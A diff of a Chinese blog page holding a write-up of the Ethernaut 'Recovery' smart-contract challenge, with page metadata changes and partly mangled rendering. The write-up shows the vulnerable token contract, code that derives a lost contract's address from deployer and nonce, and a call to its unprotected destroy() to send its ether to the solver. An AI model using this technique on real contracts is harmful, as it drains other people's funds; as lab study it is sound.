@@ -35,21 +35,21 @@
   <!-- feed -->
   <!-- 页面元数据 -->
   <title>Recovery - 笔友🍉の知识库</title>
-  <meta name="keywords" content="靶场,Solidity,null">
+  <meta name="keywords" content="Solidity,靶场,null">
   <meta desc name="description" content="Self-Discipline - 笔友🍉 - 笔友🍉の知识库">
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="Recovery">
 <meta property="og:url" content="https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Recovery/index.html">
 <meta property="og:site_name" content="笔友🍉の知识库">
-<meta property="og:description" content="Recovery1. 题目要求 1.1 合约创建者构建了一个非常简单的代币工厂合约。 任何人都可以轻松创建新代币。 在部署了一个代币合约后，创建者发送了 0.001 以太币以获得更多代币。 后边他们丢失了合约地址。 如果您能从丢失的的合约地址中找回(或移除)，则顺利通过此关。  1.2 题目代码  &#x2F;&#x2F; SPDX-License-Identifier: MIT pragma solidity ^0">
+<meta property="og:description" content="Recovery1. 题目要求 1.1 合约创建者构建了一个非常简单的代币工厂合约。 任何人都可以轻松创建新代币。 在部署了一个代币合约后，创建者发送了 0.001 以太币以获得更多代币。 后边他们丢失了合约地址。 如果您能从丢失的的合约地址中找回(或移除)，则顺利通过此关。  1.2 题目代码    123456789101112131415161718192021222324252627282">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-01-18T11:10:10.000Z">
 <meta property="article:modified_time" content="2023-01-18T11:10:10.000Z">
 <meta property="article:author" content="笔友🍉">
-<meta property="article:tag" content="靶场">
 <meta property="article:tag" content="Solidity">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1690522141791),
+    lastupdate: new Date(1692682587051),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2995,7 +2995,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：947 字</p>
+      <p>字数：941 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
@@ -3053,73 +3053,41 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </li>
 <li><p>1.2 题目代码</p>
 </li>
-<li><pre><code class="solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+</ul>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value * 10;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-contract Recovery &#123;
 
-  //generate tokens
-  function generateToken(string memory _name, uint256 _initialSupply) public &#123;
-    new SimpleToken(_name, msg.sender, _initialSupply);
-  
-  &#125;
-&#125;
 
-contract SimpleToken &#123;
-
-  string public name;
-  mapping (address =&gt; uint) public balances;
-
-  // constructor
-  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;
-    name = _name;
-    balances[_creator] = _initialSupply;
-  &#125;
-
-  // collect ether in return for tokens
-  receive() external payable &#123;
-    balances[msg.sender] = msg.value * 10;
-  &#125;
-
-  // allow transfers of tokens
-  function transfer(address _to, uint _amount) public &#123; 
-    require(balances[msg.sender] &gt;= _amount);
-    balances[msg.sender] = balances[msg.sender] - _amount;
-    balances[_to] = _amount;
-  &#125;
-
-  // clean up after ourselves
-  function destroy(address payable _to) public &#123;
-    selfdestruct(_to);
-  &#125;
-&#125;
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 2. 分析</span><br><span class="line"></span><br><span class="line">#### tips： [参考博客](https://dac.ac/blog/ethernaut_solutions/#delegation)</span><br><span class="line"></span><br><span class="line">- 2.1合约地址是确定性的，可以从合约的部署者地址和来自部署者的部署交易的随机数中得出。</span><br><span class="line"></span><br><span class="line">  在这种情况下，我们从一开始就有这些信息：</span><br><span class="line"></span><br><span class="line">  1. 合同部署者地址（我们的例子，在我的例子中`0xc03f501C5987CAaC9e4470849f13eEA338b76E9f`）</span><br><span class="line">  2. 部署第一个 SimpleToken 的随机数（1 如练习所述）</span><br><span class="line"></span><br><span class="line">  因此，我们可以轻松计算出第一个 SimpleToken 部署的合约地址，结果为`0xa26D4caf289D657F24f8d2D26f0DFe99a0B312db`.</span><br><span class="line"></span><br><span class="line">  从技术上讲，这里很容易作弊，因为通过检查实例合约的内部交易，很容易在区块浏览器上看到我们要排空的合约的合约地址。然而，练习的目的是我们自己推导出地址。</span><br><span class="line"></span><br><span class="line">  有了这些信息，我们现在要做的就是调用`destroy()`SimpleToken 合约中的函数，并将其中的资金定向到任何地址，以便将练习标记为已完成。</span><br><span class="line"></span><br><span class="line">- 2.2 做法：</span><br><span class="line"></span><br><span class="line">- 一旦我们有了这两个细节（部署地址，随机数），就像我在[解决方案](https://dac.ac/blog/ethernaut_solutions/#solution-15)中描述的那样，我们就可以在 python 中（或直接在 solidity 中）编写一个函数来获取地址。作为一个足智多谋的开发人员，即使我知道如何计算它，我仍然决定去 StackExchange 中找到一个现成的解决方案以跳过这个：</span><br><span class="line"></span><br><span class="line">- ``` js</span><br><span class="line">  # compute address of a given contract to be deployed from</span><br><span class="line">  # the deployer address + nonce, as stated in the Section 7 </span><br><span class="line">  # of the Ethereum yellowpaper for contracts created using CREATE</span><br><span class="line">  def mk_contract_address(sender: str, nonce: int) -&gt; str:</span><br><span class="line">      &quot;&quot;&quot;Create a contract address using eth-utils.</span><br><span class="line">      # Modified from Mikko Ohtamaa&#x27;s original answer which was later</span><br><span class="line">      # edited by Utgarda</span><br><span class="line">      # Obtained from https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed</span><br><span class="line">      &quot;&quot;&quot;</span><br><span class="line">      sender_bytes = to_bytes(hexstr=sender)</span><br><span class="line">      raw = rlp.encode([sender_bytes, nonce])</span><br><span class="line">      h = keccak(raw)</span><br><span class="line">      address_bytes = h[12:]</span><br><span class="line">      return to_checksum_address(address_bytes)</span><br></pre></td></tr></table></figure>
-</code></pre>
+<h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2. 分析"></a>2. 分析</h2><h4 id="tips：-参考博客"><a href="#tips：-参考博客" class="headerlink" title="tips： 参考博客"></a>tips： <a target="_blank" rel="noopener" href="https://dac.ac/blog/ethernaut_solutions/#delegation">参考博客</a></h4><ul>
+<li><p>2.1合约地址是确定性的，可以从合约的部署者地址和来自部署者的部署交易的随机数中得出。</p>
+<p>在这种情况下，我们从一开始就有这些信息：</p>
+<ol>
+<li>合同部署者地址（我们的例子，在我的例子中<code>0xc03f501C5987CAaC9e4470849f13eEA338b76E9f</code>）</li>
+<li>部署第一个 SimpleToken 的随机数（1 如练习所述）</li>
+</ol>
+<p>因此，我们可以轻松计算出第一个 SimpleToken 部署的合约地址，结果为<code>0xa26D4caf289D657F24f8d2D26f0DFe99a0B312db</code>.</p>
+<p>从技术上讲，这里很容易作弊，因为通过检查实例合约的内部交易，很容易在区块浏览器上看到我们要排空的合约的合约地址。然而，练习的目的是我们自己推导出地址。</p>
+<p>有了这些信息，我们现在要做的就是调用<code>destroy()</code>SimpleToken 合约中的函数，并将其中的资金定向到任何地址，以便将练习标记为已完成。</p>
 </li>
-<li><p>然后，我们可以插入这些值并找到第一个 SimpleToken 部署的地址：</p>
+<li><p>2.2 做法：</p>
 </li>
-<li><blockquote>
-<p>first_simpletoken_contract_address &#x3D; mk_contract_address(recovery.address, 1)</p>
-</blockquote>
+<li><p>一旦我们有了这两个细节（部署地址，随机数），就像我在<a target="_blank" rel="noopener" href="https://dac.ac/blog/ethernaut_solutions/#solution-15">解决方案</a>中描述的那样，我们就可以在 python 中（或直接在 solidity 中）编写一个函数来获取地址。作为一个足智多谋的开发人员，即使我知道如何计算它，我仍然决定去 StackExchange 中找到一个现成的解决方案以跳过这个：</p>
 </li>
-<li><p>连接到这个合约并调用<code>destroy()</code>函数，将资金发送到我的地址。</p>
-</li>
-<li><blockquote>
-<p>simpletoken.destroy(acc.address, _<strong>from</strong>)</p>
-</blockquote>
-</li>
-<li><p>攻击合约来自 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=K8AFyNiuTXs">参考视频</a></p>
-</li>
-<li><pre><code class="solidity">contract Dev &#123;
-    function recover(address sender) external pure returns (address) &#123;
-        address addr = address(uint160(uint256(
-            keccak256(abi.encodePacked(
-                bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)
-            ))
-        )));
-        return addr;
-    &#125;
-&#125;
+<li><pre><code class="js"># compute address of a given contract to be deployed from
+# the deployer address + nonce, as stated in the Section 7 
+# of the Ethereum yellowpaper for contracts created using CREATE
+def mk_contract_address(sender: str, nonce: int) -&gt; str:
+    &quot;&quot;&quot;Create a contract address using eth-utils.
+    # Modified from Mikko Ohtamaa&#39;s original answer which was later
+    # edited by Utgarda
+    # Obtained from https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
+    &quot;&quot;&quot;
+    sender_bytes = to_bytes(hexstr=sender)
+    raw = rlp.encode([sender_bytes, nonce])
+    h = keccak(raw)
+    address_bytes = h[12:]
+    return to_checksum_address(address_bytes)
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 然后，我们可以插入这些值并找到第一个 SimpleToken 部署的地址：</span><br><span class="line"></span><br><span class="line">- &gt; first_simpletoken_contract_address = mk_contract_address(recovery.address, 1)</span><br><span class="line"></span><br><span class="line">- 连接到这个合约并调用`destroy()`函数，将资金发送到我的地址。</span><br><span class="line"></span><br><span class="line">- &gt; simpletoken.destroy(acc.address, _**from**)</span><br><span class="line"></span><br><span class="line">- 攻击合约来自 [参考视频](https://www.youtube.com/watch?v=K8AFyNiuTXs)</span><br><span class="line"></span><br><span class="line"> ```solidity</span><br><span class="line">  contract Dev &#123;</span><br><span class="line">      function recover(address sender) external pure returns (address) &#123;</span><br><span class="line">          address addr = address(uint160(uint256(</span><br><span class="line">              keccak256(abi.encodePacked(</span><br><span class="line">                  bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)</span><br><span class="line">              ))</span><br><span class="line">          )));</span><br><span class="line">          return addr;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 </code></pre>
 </li>
 </ul>
@@ -3209,8 +3177,8 @@ contract SimpleToken &#123;
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>靶场</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Solidity/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>Solidity</p></a></div>
-  <span hidden itemprop="keywords">靶场 Solidity</span>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Solidity/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>Solidity</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>靶场</p></a></div>
+  <span hidden itemprop="keywords">Solidity 靶场</span>
 
 
         
@@ -3410,7 +3378,7 @@ contract SimpleToken &#123;
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E8%A6%81%E6%B1%82"><span class="toc-text">1. 题目要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98"><span class="toc-text">3. 解题</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E8%A6%81%E6%B1%82"><span class="toc-text">1. 题目要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90"><span class="toc-text">2. 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tips%EF%BC%9A-%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2"><span class="toc-text">tips： 参考博客</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98"><span class="toc-text">3. 解题</span></a></li></ol>
     </div>
   </section>
 
@@ -4458,7 +4426,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","sameAs":["https://github.com/volantis-x"],"description":"Self-Discipline"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://biyouqiuqiu.com/","name":"笔友🍉の知识库"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/","name":"Smart contracts"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/","name":"ethernaut"}},{"@type":"ListItem","position":3,"item":{"@id":"https://biyouqiuqiu.com/2023/01/18/Smart contracts/ethernaut/Recovery/","name":"Recovery"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","keywords":null,"description":"Self-Discipline","author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","description":"Self-Discipline"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://biyouqiuqiu.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Recovery","description":"Self-Discipline","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Recovery/"},"author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Recovery/","wordCount":0,"datePublished":"2023-01-18T11:10:10.000Z","dateModified":"2023-01-18T11:10:10.000Z","articleSection":"Smart contracts","keywords":"靶场,Solidity","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","sameAs":["https://github.com/volantis-x"],"description":"Self-Discipline"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://biyouqiuqiu.com/","name":"笔友🍉の知识库"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/","name":"Smart contracts"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/","name":"ethernaut"}},{"@type":"ListItem","position":3,"item":{"@id":"https://biyouqiuqiu.com/2023/01/18/Smart contracts/ethernaut/Recovery/","name":"Recovery"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","keywords":null,"description":"Self-Discipline","author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","description":"Self-Discipline"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://biyouqiuqiu.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Recovery","description":"Self-Discipline","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Recovery/"},"author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Recovery/","wordCount":0,"datePublished":"2023-01-18T11:10:10.000Z","dateModified":"2023-01-18T11:10:10.000Z","articleSection":"Smart contracts","keywords":"Solidity,靶场","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
